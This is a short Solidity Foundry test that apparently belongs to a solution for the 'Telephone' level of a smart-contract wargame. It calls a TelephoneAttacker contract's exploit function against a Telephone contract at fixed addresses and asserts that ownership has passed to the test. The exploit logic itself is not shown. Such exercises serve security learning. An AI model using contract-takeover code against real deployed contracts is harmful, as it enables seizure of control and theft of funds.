// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel04.sol";
import "../src/level04.sol";

contract Attacker is Test {
    Telephone level04 = Telephone(0xB2679387Bd9dd16eBBd8F76e6035610a0da70bEB);
    TelephoneAttacker attacker =
        TelephoneAttacker(0x2c2C9f3707c67ceCc9A2cc380B7CB10b8598283E);

    function test() external {
        attacker.exploit();
        assertEq(level04.owner(), address(this));
    }
}
